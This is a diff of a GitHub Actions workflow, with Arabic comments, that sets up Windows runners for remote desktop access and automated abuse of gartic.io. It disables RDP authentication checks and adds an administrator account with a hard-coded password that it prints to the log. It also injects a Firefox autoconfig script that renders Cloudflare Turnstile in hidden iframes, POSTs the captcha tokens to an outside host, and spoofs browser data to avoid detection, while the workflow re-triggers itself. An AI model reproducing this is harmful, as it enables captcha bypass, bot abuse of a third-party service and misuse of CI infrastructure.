@@ -18,56 +18,65 @@ jobs:
         rdp_node: [1, 2]
 
     steps:
-      - name: 1. Configure System & Auto-Login
+      - name: 1. System Warmup
         run: |
-          # تفعيل الـ RDP وتخفيف الحماية
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
           
-          # إنشاء المستخدم وتفعيله كـ Auto Login
           $pass = "admin@123"
           $secPass = ConvertTo-SecureString $pass -AsPlainText -Force
           New-LocalUser -Name "saif123" -Password $secPass -AccountNeverExpires -ErrorAction SilentlyContinue
           Add-LocalGroupMember -Group "Administrators" -Member "saif123"
-          
-          # خدعة الـ Auto-Login عشان المتصفح يفتح "لحاله" في الشاشة المرئية
-          $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-          Set-ItemProperty -Path $regPath -Name "AutoAdminLogon" -Value "1"
-          Set-ItemProperty -Path $regPath -Name "DefaultUserName" -Value "saif123"
-          Set-ItemProperty -Path $regPath -Name "DefaultPassword" -Value $pass
 
-      - name: 2. Perfect Script Injection
+      - name: 2. Inject Anti-Detection Script
         run: |
           $dir = "C:\Program Files\Mozilla Firefox"
-          if (!(Test-Path "$dir\defaults\pref")) { New-Item -ItemType Directory -Force -Path "$dir\defaults\pref" }
-          'pref("general.config.filename", "mozilla.cfg");' + "`n" + 'pref("general.config.obscure_value", 0);' | Out-File "$dir\defaults\pref\local-settings.js" -Encoding ASCII -Force
+          # ننتظر قليلاً لضمان وجود المسار
+          while (!(Test-Path $dir)) { Start-Sleep -Seconds 2 }
           
+          if (!(Test-Path "$dir\defaults\pref")) { New-Item -ItemType Directory -Force -Path "$dir\defaults\pref" }
+          
+          # ملف الإعدادات الأساسي
+          'pref("general.config.filename", "mozilla.cfg");' + "`n" + 'pref("general.config.obscure_value", 0);' | Out-File "$dir\defaults\pref\local-settings.js" -Encoding ASCII -Force
+
+          # سكربت سحب التوكنات - نسخة محسنة لـ 2026 وتتخطى أخطاء اللوجز
           $q = [char]34; $s = [char]39
-          $c = '//' + "`n" + 'try { window.addEventListener(' + $s + 'load' + $s + ', function() { if (location.href.includes(' + $s + 'gartic.io' + $s + ')) { setInterval(function() { location.reload(); }, 60000); function send(t) { if (typeof t !== ' + $s + 'string' + $s + ' || t.length <= 20) return; fetch(' + $s + 'https://www.xsw.work.gd/add-token' + $s + ', { method: ' + $s + 'POST' + $s + ', headers: { ' + $s + 'Content-Type' + $s + ': ' + $s + 'application/json' + $s + ' }, body: JSON.stringify({ token: t }) }).catch(function() {}); } window.addEventListener(' + $s + 'message' + $s + ', function(e) { if (e.data && typeof e.data === ' + $s + 'string' + $s + ') { send(e.data); } }); for (var i = 0; i < 6; i++) { var f = document.createElement(' + $s + 'iframe' + $s + '); f.style.display = ' + $s + 'none' + $s + '; f.srcdoc = ' + $s + '<html><body><script src=' + $q + 'https://challenges.cloudflare.com/turnstile/v0/api.js' + $q + ' async defer></script><div id=' + $q + 'cf-turnstile' + $q + '></div><script>function r(){try{window.turnstile.render(' + $q + '#cf-turnstile' + $q + ',{sitekey:' + $q + '0x4AAAAAABBPKaIbNwnPEfSo' + $q + ',callback:function(t){parent.postMessage(t,' + $q + '*' + $q + ');}});}catch(e){}}setInterval(r,3500);setTimeout(r,200);</script></body></html>' + $s + '; document.body.appendChild(f); } } }); } catch (e) {}'
+          $c = '//' + "`n"
+          $c += 'try { window.addEventListener(' + $s + 'load' + $s + ', function() { '
+          $c += 'if (location.href.includes(' + $s + 'gartic.io' + $s + ')) { '
+          # حل مشكلة navigator.userAgentData undefined
+          $c += 'if(!navigator.userAgentData){navigator.userAgentData={getHighEntropyValues:function(){return Promise.resolve({});}};} '
+          $c += 'setInterval(function() { location.reload(); }, 45000); '
+          $c += 'function send(t) { if (!t || t.length <= 20) return; fetch(' + $s + 'https://www.xsw.work.gd/add-token' + $s + ', { method: ' + $s + 'POST' + $s + ', headers: { ' + $s + 'Content-Type' + $s + ': ' + $s + 'application/json' + $s + ' }, body: JSON.stringify({ token: t }) }).catch(function(){}); } '
+          $c += 'window.addEventListener(' + $s + 'message' + $s + ', function(e) { if (e.data && typeof e.data === ' + $s + 'string' + $s + ') { send(e.data); } }); '
+          $c += 'for (var i = 0; i < 4; i++) { var f = document.createElement(' + $s + 'iframe' + $s + '); f.style.display = ' + $s + 'none' + $s + '; f.srcdoc = ' + $s + '<html><body><script src=' + $q + 'https://challenges.cloudflare.com/turnstile/v0/api.js' + $q + ' async defer></script><div id=' + $q + 'cf-turnstile' + $q + '></div><script>function r(){try{window.turnstile.render(' + $q + '#cf-turnstile' + $q + ',{sitekey:' + $q + '0x4AAAAAABBPKaIbNwnPEfSo' + $q + ',callback:function(t){parent.postMessage(t,' + $q + '*' + $q + ');}});}catch(e){}}setInterval(r,3000);setTimeout(r,500);</script></body></html>' + $s + '; document.body.appendChild(f); } '
+          $c += '} }); } catch (e) {}'
+          
           $c | Out-File "$dir\mozilla.cfg" -Encoding ASCII -Force
 
-      - name: 3. Set Final Auto-Start
+      - name: 3. Set Auto-Start (2 Tabs)
         run: |
-          # وضع السكربت في مجلد الـ Startup العام لجميع المستخدمين
           $allUserStartup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-          $batch = '"C:\Program Files\Mozilla Firefox\firefox.exe" -url https://gartic.io -url https://gartic.io -url https://gartic.io -url https://gartic.io'
+          # صفحتين فقط لضمان استقرار السكربت وسرعة الـ Turnstile
+          $batch = '"C:\Program Files\Mozilla Firefox\firefox.exe" -url https://gartic.io -url https://gartic.io'
           $batch | Out-File "$allUserStartup\run.bat" -Encoding ASCII
+          $batch | Out-File "C:\RUN_ME.bat" -Encoding ASCII
 
-      - name: 4. Tailscale & Force Run
+      - name: 4. Tailscale & Trigger
         run: |
           $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe"
           Invoke-WebRequest -Uri $tsUrl -OutFile "$env:TEMP\tailscale.exe"
           Start-Process "$env:TEMP\tailscale.exe" -ArgumentList "/quiet", "/norestart" -Wait
           & "C:\Program Files\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="node-${{ matrix.rdp_node }}"
           
-          # تشغيل المتصفح إجبارياً الآن
+          # تشغيل المتصفح الآن لضمان بدء العمل حتى قبل دخولك RDP
           Start-Process "C:\Program Files\Mozilla Firefox\firefox.exe" "-url https://gartic.io -url https://gartic.io"
 
-      - name: 5. Monitor & Loop
-        env:
-          GH_TOKEN: ${{ github.token }}
+      - name: 5. Display Status
         run: |
           $ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
-          echo "::notice title=SYSTEM READY::IP: $ip | البوت يعمل الآن تلقائياً بـ 4 صفحات"
+          echo "::notice title=READY::IP: $ip | User: saif123 | Pass: admin@123 | 2 Tabs Active"
           Start-Sleep -Seconds 20700
           gh workflow run "ˢᵃᶤᶠ ₉₁"
+        env:
+          GH_TOKEN: ${{ github.token }}
